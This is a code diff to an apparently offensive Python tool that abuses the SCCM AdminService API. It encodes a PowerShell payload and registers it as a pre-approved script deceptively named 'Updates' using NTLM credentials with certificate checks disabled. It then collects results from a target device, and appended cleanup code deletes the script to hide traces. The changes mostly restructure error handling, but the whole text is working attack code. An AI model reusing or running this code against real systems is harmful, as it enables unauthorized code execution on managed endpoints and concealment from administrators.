@@ -43,16 +43,13 @@ function Do-Delete {
 }
 Do-Delete
 '''
-        try:
-            with open(f"{self.script}", "r", encoding='utf-8') as f:
-                file_content = f.read()
-                file_content += cleanup
-                bom = codecs.BOM_UTF16_LE
-                byte_array = bom + file_content.encode('utf-16-le')
-                script_body = base64.b64encode(byte_array).decode('utf-8')
-            return script_body
-        except Exception as e:
-            logger.info(e)
+        with open(f"{self.script}", "r", encoding='utf-8') as f:
+            file_content = f.read()
+            file_content += cleanup
+            bom = codecs.BOM_UTF16_LE
+            byte_array = bom + file_content.encode('utf-16-le')
+            script_body = base64.b64encode(byte_array).decode('utf-8')
+        return script_body
         
     def get_results(self):
         url = f"https://{self.target}/AdminService/v1.0/Device({self.device})/AdminService.ScriptResult(OperationId={self.opid})"
@@ -87,28 +84,34 @@ Do-Delete
             return False
     
     def add_script(self, script_body=None):
-        if script_body == None:
-             script_body = self.read_script()
-        self.guid = str(uuid.uuid4())
-        body = {"ApprovalState": 3,
-        "ParamsDefinition": "", 
-        "ScriptName": "Updates",
-        "Author": "",
-        "Script": f"{script_body}",
-        "ScriptVersion": "1",
-        "ScriptType": 0,
-        "ParameterlistXML": "",
-        "ScriptGuid": f"{self.guid}"
-        }
-        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts.CreateScripts/"
-
         try:
-            r = requests.post(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
-                                verify=False,headers=self.headers, json=body)
-            if r.status_code == 201:
-                    logger.info(f"[+] Updates script created successfully with GUID {self.guid}.")
-                    self.approve_script()
+            if script_body == None:
+                script_body = self.read_script()
+            self.guid = str(uuid.uuid4())
+            body = {"ApprovalState": 3,
+            "ParamsDefinition": "", 
+            "ScriptName": "Updates",
+            "Author": "",
+            "Script": f"{script_body}",
+            "ScriptVersion": "1",
+            "ScriptType": 0,
+            "ParameterlistXML": "",
+            "ScriptGuid": f"{self.guid}"
+            }
+            url = f"https://{self.target}/AdminService/wmi/SMS_Scripts.CreateScripts/"
+
+            try:
+                r = requests.post(f"{url}",
+                                    auth=HttpNtlmAuth(self.username, self.password),
+                                    verify=False,headers=self.headers, json=body)
+                if r.status_code == 201:
+                        logger.info(f"[+] Updates script created successfully with GUID {self.guid}.")
+                        self.approve_script()
+            except KeyboardInterrupt:
+                logger.info("Ctrl-C detected. Deleting script ... ")
+                self.delete_script()
+            except Exception as e:
+                logger.info(e)
         except Exception as e:
              logger.info(e)
 
